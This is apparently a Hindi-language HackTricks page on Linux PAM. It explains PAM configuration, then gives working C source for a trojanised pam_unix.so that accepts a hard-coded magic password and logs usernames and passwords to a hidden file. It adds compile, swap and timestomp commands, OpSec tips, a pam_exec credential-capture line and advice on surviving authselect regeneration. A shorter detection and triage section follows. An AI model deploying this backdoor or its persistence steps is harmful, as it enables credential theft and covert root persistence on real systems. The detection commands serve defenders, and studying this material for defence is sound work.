# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### मूलभूत जानकारी

**PAM (Pluggable Authentication Modules)** एक security mechanism के रूप में कार्य करता है, जो **computer services तक पहुंचने का प्रयास करने वाले users की पहचान verify करता है**, और विभिन्न criteria के आधार पर उनकी access को नियंत्रित करता है। यह एक digital gatekeeper के समान है, जो सुनिश्चित करता है कि केवल authorized users ही specific services का उपयोग कर सकें और system overload को रोकने के लिए उनके usage को सीमित भी कर सकता है।

#### Configuration Files

- **Solaris** legacy central file `/etc/pam.conf` को support करता है, लेकिन वर्तमान guidance `/etc/pam.d` के अंतर्गत service files का उपयोग करने को प्राथमिकता देती है।<sup>[[10]](#references)</sup>
- **Linux systems** directory-based approach को प्राथमिकता देते हैं और service-specific configurations को `/etc/pam.d` में store करते हैं। उदाहरण के लिए, login service की configuration file `/etc/pam.d/login` पर मिलती है।<sup>[[1]](#references)</sup>

login service के लिए PAM configuration का एक उदाहरण इस प्रकार दिख सकता है:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

ये realms या management groups, **auth**, **account**, **password**, और **session** को शामिल करते हैं; इनमें से प्रत्येक authentication और session management process के अलग-अलग पहलुओं के लिए जिम्मेदार है:<sup>[[1]](#references)</sup>

- **Auth**: User identity को validate करता है, अक्सर password के लिए prompt करके।
- **Account**: Account verification संभालता है और group membership या time-of-day restrictions जैसी conditions की जांच करता है।
- **Password**: Password updates manage करता है, जिसमें complexity checks या dictionary attacks की prevention शामिल है।
- **Session**: Service session शुरू या समाप्त होने के दौरान actions manage करता है, जैसे directories mount करना या resource limits सेट करना।

#### **PAM Module Controls**

Controls module की success या failure पर प्रतिक्रिया निर्धारित करते हैं और overall authentication process को प्रभावित करते हैं। इनमें शामिल हैं:<sup>[[1]](#references)</sup>

- **Required**: Required module की failure से अंततः failure होता है, लेकिन केवल तब जब सभी subsequent modules की जांच हो जाए।
- **Requisite**: Failure होने पर process तुरंत terminate हो जाता है।
- **Sufficient**: यदि पहले का कोई `required` module fail नहीं हुआ है, तो success तुरंत return होता है और उसी management group के remaining modules skip हो जाते हैं।
- **Optional**: Failure केवल तब होता है जब stack में यही एकमात्र module हो।

#### Offensive Semantics That Matter

PAM का analysis या modification करते समय, **inserted rule की location** यह निर्धारित करती है कि कौन-सा stack उसे देखेगा:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` और `substack` अन्य files से rules लेते हैं, इसलिए `sshd` को edit करने से केवल SSH प्रभावित हो सकता है, जबकि `system-auth`, `common-auth` या किसी अन्य shared stack को edit करने से एक साथ कई services प्रभावित हो सकती हैं।<sup>[[1]](#references)[[13]](#references)</sup>
- PAM bracketed controls जैसे `[success=1 default=ignore]` को भी support करता है। इनका दुरुपयोग successful custom check के बाद एक या अधिक modules को **skip करने** के लिए किया जा सकता है, बजाय इसके कि `pam_unix.so` को स्पष्ट रूप से replace किया जाए।<sup>[[1]](#references)</sup>
- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) या default PAM module directory के सापेक्ष **relative** हो सकता है। Modern Linux systems में वास्तविक directories अक्सर `/lib/security`, `/lib64/security`, `/usr/lib/security` या `/usr/lib/x86_64-linux-gnu/security` जैसे multiarch paths होते हैं।<sup>[[1]](#references)[[14]](#references)</sup>

Quick operator takeaway: patching से पहले हमेशा **full service graph** map करें। उदाहरण के लिए, कुछ distros में `sshd -> password-auth -> system-auth` या अन्य में `sshd -> system-remote-login -> system-login -> system-auth` होने का अर्थ है कि वही one-line implant अपेक्षा से कहीं अधिक व्यापक प्रभाव डाल सकता है।<sup>[[1]](#references)[[13]](#references)</sup>

#### Example Scenario

कई auth modules वाले setup में process एक strict order का पालन करता है। यदि `pam_securetty` module login terminal को unauthorized पाता है, तो root logins block हो जाते हैं, फिर भी उसके "required" status के कारण सभी modules process किए जाते हैं। `pam_env` environment variables set करता है, जिससे user experience बेहतर हो सकता है। `pam_ldap` और `pam_unix` modules user को authenticate करने के लिए मिलकर काम करते हैं; `pam_unix` पहले से दिए गए password का उपयोग करने का प्रयास करता है, जिससे authentication methods में efficiency और flexibility बढ़ती है।<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

High-value Linux environments में एक classic persistence trick **legitimate PAM library को trojanised drop-in से swap करना** है। ऐसे host पर, जिसके PAM stack में `pam_unix.so` load होता है, SSH या console authentication इसके `pam_sm_authenticate()` entry point को invoke कर सकता है; malicious replacement credentials capture कर सकता है या *magic* password bypass implement कर सकता है।<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
नीचे दिया गया sketch Linux-PAM के `pam_sm_authenticate()` service entry point और authentication token access करने के लिए `pam_get_authtok()` का उपयोग करता है।<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Compile करें और stealth-replace करें (replacement/timestomp pattern को Unit 42 द्वारा document किया गया है)। wrapper में hard-coded backup path और नीचे दिए गए commands, दोनों को target की वास्तविक PAM module directory के अनुसार adjust करें:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec सुझाव
1. **Atomic overwrite** – एक complete library को temporary file में लिखें और उसे स्थान पर rename करें, ताकि आंशिक रूप से लिखे गए authentication module को छोड़ने से बचा जा सके।
2. Unit 42 के AuthDoor analysis में `/usr/bin/.dbus.log` जैसे path को देखा गया था, इसलिए यह hunting indicator के रूप में भी उपयोगी है।<sup>[[2]](#references)</sup>
3. PAM stack द्वारा अपेक्षित entry points (उदाहरण के लिए, `pam_sm_authenticate` और `pam_sm_setcred`) को सुरक्षित रखें, ताकि अन्य management operations काम करते रहें।<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
Package-integrity checks के लिए, RPM installed-file metadata को verify करता है, `debsums -s` checksum errors report करता है, और triage block में `dpkg -S` package ownership को query करता है; audit watch syntax किसी path पर writes और attribute changes को record करता है।<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` के MD5/SHA256 की distro package से तुलना करें।
* बिना manual hashing के replaced libraries का पता लगाने के लिए `rpm -V pam` या `debsums -s libpam-modules` चलाएँ।
* `/lib/security/` के अंतर्गत world-writable या असामान्य ownership की जाँच करें।
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Unexpected modules के लिए PAM configs में Grep करें: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### त्वरित triage commands (post-compromise या threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Persistence के लिए `pam_exec` का दुरुपयोग
`pam_unix.so` को बदलने के बजाय, `/etc/pam.d/sshd` में `pam_exec` लाइन जोड़ना एक हल्का तरीका है, जिससे उस PAM लाइन तक पहुंचने वाला invocation एक helper चलाता है और सामान्य stack यथावत बना रहता है।<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` PAM metadata को `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` और `PAM_TYPE` जैसे environment variables में प्राप्त करता है। `expose_authtok` के साथ, helper `auth` या `password` phases के दौरान `stdin` से password के अधिकतम `PAM_MAX_RESP_SIZE` bytes पढ़ सकता है। यदि आप चाहते हैं कि helper real UID के बजाय effective UID के साथ चले, तो `seteuid` जोड़ें।<sup>[[4]](#references)</sup>

व्यावहारिक notes, `pam_exec` के लिए documented module types और `type=` filter के अनुसार, इस प्रकार हैं:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` **post-login actions** के लिए बेहतर है, जैसे sockets को फिर से खोलना या detached daemon को spawn करना।
- `auth optional pam_exec.so quiet expose_authtok ...` सामान्यतः **credential capture** के लिए उपयोग किया जाता है, क्योंकि यह session खुलने से पहले चलता है।
- `type=session` या `type=auth` का उपयोग execution को किसी विशिष्ट PAM phase तक सीमित करने और अनावश्यक double execution से बचने के लिए किया जा सकता है।

### Distro tooling से बचना: `authselect`

RHEL और Fedora-family systems पर, जो `authselect` का उपयोग करते हैं, `/etc/pam.d/system-auth` या `/etc/pam.d/password-auth` जैसी generated files में किए गए direct edits को **`authselect` द्वारा overwrite किया जा सकता है**। Persistence के लिए, operators अक्सर `/etc/authselect/custom/<profile>/` के अंतर्गत active custom profile में patch करते हैं और फिर उसे दोबारा select करते हैं।<sup>[[5]](#references)[[19]](#references)</sup>

जब आपके पास root हो, तो सामान्य workflow:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
यह offense और triage दोनों के लिए महत्वपूर्ण है: यदि `/etc/pam.d/system-auth` में `Generated by authselect` और `Do not modify this file manually` banner मौजूद है, तो वास्तविक persistence point `/etc/pam.d/` के बजाय `/etc/authselect/custom/` के अंतर्गत हो सकता है।<sup>[[5]](#references)</sup>

### हाल में देखी गई tradecraft

हाल की 2025 reporting में **Plague** Linux backdoor ने इसी core idea को और आगे बढ़ाया: एक malicious PAM component जिसमें **static bypass password** था, साथ ही login के बाद session traces कम करने के लिए SSH-संबंधित environment variables और shell history (`HISTFILE=/dev/null`) की cleanup की गई थी।<sup>[[3]](#references)</sup> यह एक उपयोगी hunting pattern है, क्योंकि backdoor logic PAM में हो सकता है, जबकि stealth artifacts केवल **authentication सफल होने के बाद** दिखाई देते हैं।


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Linux के लिए नया खोजा गया PAM-Based Backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect का उपयोग करके user authentication configure करना - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux manual page](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4 में Authentication प्रबंधित करना](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [System-Level Authentication Guide - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu package file list: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM Manual](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM Manual](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
